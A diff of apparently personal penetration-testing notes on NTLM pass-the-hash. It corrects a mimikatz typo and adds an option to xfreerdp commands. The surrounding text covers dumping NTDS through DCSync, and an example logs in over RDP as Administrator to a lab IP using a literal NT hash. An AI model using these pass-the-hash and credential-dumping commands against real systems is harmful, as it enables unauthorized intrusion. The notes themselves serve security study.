@@ -30,7 +30,7 @@ There are several primary sources of NT hashes:
 	- NTDS (NT Directory Services) contains all domain user credentials, including NT hashes.
 	- Extracting it requires either physical access, VSS snapshot abuse, or replication rights ( [DRSUAPI](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/58f33216-d9f1-43bf-a183-87e3c899c410) `DCSync`).
 
->[!note] To learn more on how to dump credentials from a Windows host, see [[SAM & LSA Secrets_]].
+>[!note] To learn more on how to dump credentials from a Windows host, see [[Registry & LSA secrets]].
 
 NTLM is used for authentication in many protocols, including:
 - **SMB** (TCP port `445`): by far the most common target; often provides authenticated shares (`C$`, `ADMIN$`) and RPC transport for service management.
@@ -83,7 +83,7 @@ Key options:
 
 Some other useful commands:
 
-- `privilrge::debug`: requests the `SeDebugPrivilege` (debug privilege); required to debug and manipulate processed owned by other accounts.
+- `privilege::debug` requests the `SeDebugPrivilege` (debug privilege); required to debug and manipulate processes owned by other accounts.
 
 ```powershell
 privilege::debug
@@ -522,12 +522,12 @@ PtH attacks can also be performed via RDP to gain GUI access to the target syste
 You can use `xfreerdp` for this. Connect as normal but instead of a password (`/p:` option), specify an NT hash (`/pth:` option):
 
 ```bash
-xfreerdp /v:<target_ip_address> /u:<username> /pth:<NT_hash>
+xfreerdp /v:<target_ip_address> /u:<username> /pth:<NT_hash> /dynamic-resolution
 ```
 
 >[!example]+
 > ```bash
-> xfreerdp /v:10.129.7.221 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+> xfreerdp /v:10.129.7.221 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /dynamic-resolution
 > ```
 
 >[!warning] By default, modern Windows (Windows 10/Server 2016+) enforces **[Restricted Admin Mode](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn408190(v=ws.11))** for RDP logins, which _prevents_ PtH logins using hashes.
@@ -550,7 +550,8 @@ xfreerdp /v:<target_ip_address> /u:<username> /pth:<NT_hash>
 > ```
 > 
 > ```bash
-> xfreerdp /v:10.129.7.221 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+> xfreerdp /v:10.129.7.221 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /dynamic-resolution
+
 > ```
 > 
 > ![[rdp_success.png]]
